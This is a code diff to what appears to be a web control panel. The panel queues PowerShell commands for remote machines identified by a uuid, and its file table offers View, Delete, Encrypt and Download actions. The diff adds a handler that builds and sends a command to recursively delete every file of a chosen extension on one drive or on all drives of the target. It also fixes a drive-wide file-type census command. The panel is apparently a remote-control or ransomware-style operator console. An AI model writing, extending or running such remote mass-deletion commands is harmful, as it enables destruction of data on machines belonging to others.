@@ -975,7 +975,7 @@ function get_file_list(e) {
 
   }
   else{
-    var command=`(Get-ChildItem  -Path ${e}:\ -Filter *.* -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).Extension | Group-Object | Where-Object { $_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name |ConvertTo-Json`
+    var command=`(Get-ChildItem  -Path ${e}:\\\ -Filter *.* -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).Extension | Group-Object | Where-Object { $_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name |ConvertTo-Json`
 
   }
   $.post(
@@ -1007,7 +1007,7 @@ function get_file_list_res(e) {
         <td class="tdf">${name_format}</td>
         <td class="tdf">${count_format}</td>
         <td class="tdf">2GB</td>
-        <td class="tdf"> <a href="javascript:void(0)"  >View </a><a href="javascript:void(0)"  >Delete </a><a href="javascript:void(0)"  >Encrypt </a><a href="javascript:void(0)"  >Download </a></td>
+        <td class="tdf"> <a href="javascript:void(0)"  >View </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="${name_format}">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  >Download </a></td>
 
        
       </tr>
@@ -1020,7 +1020,36 @@ function get_file_list_res(e) {
   );
    
 }
-
+function delete_file_format(e){
+  var file_format = $(e).attr("file_format");
+  var uuid = window.location.href.split("#")[1];
+  var option_drive=$("#select_drive").val()
+  if (option_drive=="ALL"){
+    var command=`$list=Get-PSDrive -PSProvider 'FileSystem'| foreach {$_.name+':\\\'};(Get-ChildItem  -Path $list -Filter *${file_format} -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).FullName | Remove-Item`
+    var message=`Delete All ${file_format} Files in System ?`
+  }else{
+    var command=`(Get-ChildItem  -Path ${option_drive}:\\\ -Filter *${file_format} -Recurse -Attributes Archive ).FullName | Remove-Item`
+    var message=`Delete All ${file_format} Files in ${option_drive} Partition ?`
+    
+    
+  }
+  swal({
+    title: "Are you sure",
+    text: message,
+    icon: "warning",
+    buttons: true,
+    dangerMode: true,
+  }).then((willDelete) => {
+    if (willDelete) {
+      $.post(
+        BASE_URL,
+        { add_command: true, command: command, uuid: uuid, token: token },function(data){
+          localStorage.setItem("cmd_uid", data.trim());
+    
+        });
+    }
+  });
+}
 
 function get_drive_list_res(e) {
   var uuid = window.location.href.split("#")[1];
